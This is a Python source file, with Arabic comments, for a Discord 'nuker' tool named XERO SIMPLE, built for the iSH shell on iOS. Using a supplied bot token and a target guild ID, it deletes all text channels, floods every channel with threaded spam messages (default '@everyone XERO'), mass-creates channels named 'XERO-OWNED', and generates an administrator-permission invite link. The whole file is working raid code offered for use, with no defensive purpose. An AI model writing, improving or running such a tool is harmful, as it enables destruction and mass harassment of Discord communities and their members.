"""
XERO SIMPLE - iSH EDITION (iOS)
OPTIMIZED FOR ALPINE LINUX
"""
import os
import sys
import time
import json
import threading
try:
    import requests
except:
    os.system("pip3 install requests --break-system-packages")
    import requests

# ============================================
# إعدادات iSH الأساسية
# ============================================
os.system("clear")

print("""
\033[91m
╔══════════════════════════════════╗
║    XERO SIMPLE - iSH EDITION     ║
║        JUST WHAT YOU NEED        ║
╚══════════════════════════════════╝
\033[0m
""")

# يطلب التوكن
token = input("\033[91m[?] BOT TOKEN:\033[0m ").strip()
if not token:
    print("\033[91m[!] Token required!\033[0m")
    sys.exit(1)

class XeroSimple:
    def __init__(self, guild_id, token):
        self.guild_id = guild_id
        self.token = token
        self.spamming = False
        self.spam_count = 0
        self.spam_threads = []
        self.headers = {"Authorization": f"Bot {self.token}"}
        # iSH ما يتحمل ثريدات كثيرة - نخليها 3 بس
        self.max_workers = 3

    def api_call(self, method, url, **kwargs):
        """طريقة موحدة لطلبات API مع معالجة أخطاء iSH"""
        try:
            if method == "get":
                return requests.get(url, headers=self.headers, timeout=10, **kwargs)
            elif method == "post":
                return requests.post(url, headers=self.headers, timeout=10, **kwargs)
            elif method == "delete":
                return requests.delete(url, headers=self.headers, timeout=10, **kwargs)
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            return None

    def get_all_channels(self):
        """يجيب القنوات - بطريقة بسيطة تناسب iSH"""
        r = self.api_call("get", f"https://discord.com/api/v10/guilds/{self.guild_id}/channels")
        if r and r.status_code == 200:
            return [c for c in r.json() if c['type'] == 0]
        return []

    # ==================== حذف القنوات ====================
    def delete_all_channels(self):
        """حذف قناة قناة - أفضل لـ iSH"""
        channels = self.get_all_channels()
        if not channels:
            print("\033[91m[!] No channels found!\033[0m")
            return
        
        print(f"\n\033[91m[💀] Deleting {len(channels)} channels...\033[0m\n")
        
        deleted = 0
        for i, channel in enumerate(channels, 1):
            r = self.api_call("delete", f"https://discord.com/api/v10/channels/{channel['id']}")
            if r and r.status_code == 200:
                deleted += 1
                print(f"\033[91m[💀] Deleted: {channel['name']} ({i}/{len(channels)})\033[0m")
            else:
                print(f"\033[93m[!] Failed: {channel['name']}\033[0m")
            time.sleep(0.3)  # تأخير بسيط عشان iSH ما يعلق
        
        print(f"\n\033[91m[✓] Deleted {deleted}/{len(channels)}\033[0m")

    # ==================== سبام ====================
    def spam_single_channel(self, channel_id, message):
        """سبام في قناة واحدة - ثريد مستقل"""
        local_count = 0
        while self.spamming:
            try:
                r = self.api_call(
                    "post",
                    f"https://discord.com/api/v10/channels/{channel_id}/messages",
                    json={"content": message}
                )
                if r and r.status_code == 200:
                    self.spam_count += 1
                    local_count += 1
                elif r and r.status_code == 429:
                    time.sleep(1)
                else:
                    time.sleep(0.5)
            except:
                time.sleep(0.5)

    def spam_all_channels(self, message):
        """سبام بإستخدام ثريدات محدودة لـ iSH"""
        channels = self.get_all_channels()
        if not channels:
            print("\033[91m[!] No channels found!\033[0m")
            return
        
        print(f"\n\033[96m[🔥] Spamming {len(channels)} channels...\033[0m")
        print("\033[96m[!] PRESS ENTER TO STOP\033[0m\n")
        
        # ثريد واحد لكل قناة - أفضل لـ iSH
        self.spam_threads = []
        for channel in channels:
            t = threading.Thread(target=self.spam_single_channel, args=(channel['id'], message))
            t.daemon = True
            t.start()
            self.spam_threads.append(t)

    def start_spam(self, message):
        if self.spamming:
            return
        self.spamming = True
        self.spam_count = 0
        threading.Thread(target=self.spam_all_channels, args=(message,), daemon=True).start()
        # عداد بسيط
        while self.spamming:
            sys.stdout.write(f"\r\033[96m[🔥] Messages sent: {self.spam_count}\033[0m")
            sys.stdout.flush()
            time.sleep(1)

    def stop_spam(self):
        self.spamming = False
        print(f"\n\033[91m[!] Stopped. Total: {self.spam_count}\033[0m")

    # ==================== إنشاء قنوات ====================
    def create_channels(self, name, amount):
        """إنشاء قنوات واحدة واحدة لـ iSH"""
        print(f"\n\033[92m[🏗️] Creating {amount} channels...\033[0m\n")
        
        created = 0
        for i in range(amount):
            channel_name = f"{name}-{i+1}" if amount > 1 else name
            r = self.api_call(
                "post",
                f"https://discord.com/api/v10/guilds/{self.guild_id}/channels",
                json={"name": channel_name, "type": 0}
            )
            if r and r.status_code == 201:
                created += 1
                print(f"\033[92m[+] {created}/{amount}: {channel_name}\033[0m")
            else:
                print(f"\033[93m[-] Failed: {channel_name}\033[0m")
            time.sleep(0.5)  # مهم لـ iSH
        
        print(f"\n\033[92m[✓] Created {created}/{amount}\033[0m")

    # ==================== رابط الدعوة ====================
    def get_invite(self):
        r = self.api_call("get", "https://discord.com/api/v10/oauth2/applications/@me")
        if r and r.status_code == 200:
            cid = r.json()['id']
            return f"https://discord.com/oauth2/authorize?client_id={cid}&permissions=8&scope=bot"
        return None

    # ==================== القائمة ====================
    def menu(self):
        while True:
            os.system("clear")
            print(f"""
\033[91m
╔══════════════════════════════════╗
║   XERO SIMPLE - iSH EDITION      ║
║   TARGET: {self.guild_id}                 
╠══════════════════════════════════╣
║                                  ║
║  [1] 💀 DELETE ALL CHANNELS      ║
║  [2] 🔥 SPAM ALL CHANNELS        ║
║  [3] 🏗️ CREATE CHANNELS          ║
║  [4] 🔗 SHOW INVITE LINK         ║
║  [5] 🔄 CHANGE TARGET            ║
║  [6] 🚪 EXIT                     ║
║                                  ║
╚══════════════════════════════════╝
\033[0m
            """)
            
            choice = input("\033[91m[XERO]\033[0m > ")

            if choice == "1":
                confirm = input("\033[91m[!] ARE YOU SURE? (yes/no): \033[0m")
                if confirm.lower() == 'yes':
                    self.delete_all_channels()
                input("\n[PRESS ENTER]")
                
            elif choice == "2":
                message = input("\033[96m[?] MESSAGE:\033[0m ") or "@everyone XERO 🔥"
                self.start_spam(message)
                input()
                self.stop_spam()
                
            elif choice == "3":
                name = input("\033[92m[?] NAME:\033[0m ") or "XERO-OWNED"
                try:
                    amount = int(input("\033[92m[?] HOW MANY:\033[0m "))
                except:
                    amount = 20
                self.create_channels(name, amount)
                input("\n[PRESS ENTER]")
                
            elif choice == "4":
                invite = self.get_invite()
                if invite:
                    print(f"\n\033[96m[🔗] {invite}\033[0m")
                else:
                    print("\033[91m[!] Failed\033[0m")
                input("\n[PRESS ENTER]")
                
            elif choice == "5":
                return "change"
                
            elif choice == "6":
                print("\033[91m[!] BYE!\033[0m")
                return "exit"

# ==================== البداية ====================
os.system("clear")

# فحص التوكن
try:
    r = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": f"Bot {token}"},
        timeout=10
    )
    if r.status_code == 200:
        info = r.json()
        print(f"\033[92m[✓] Connected: {info['username']}\033[0m\n")
    else:
        print("\033[91m[!] Invalid token!\033[0m")
        sys.exit(1)
except:
    print("\033[91m[!] No internet or API blocked!\033[0m")
    sys.exit(1)

while True:
    guild_id = input("\033[91m[?] GUILD ID:\033[0m ").strip()
    if guild_id.lower() == 'exit':
        sys.exit(0)
    if not guild_id.isdigit():
        print("\033[91m[!] Invalid!\033[0m")
        continue
    
    xero = XeroSimple(guild_id, token)
    result = xero.menu()
    if result == "exit":
        sys.exit(0)
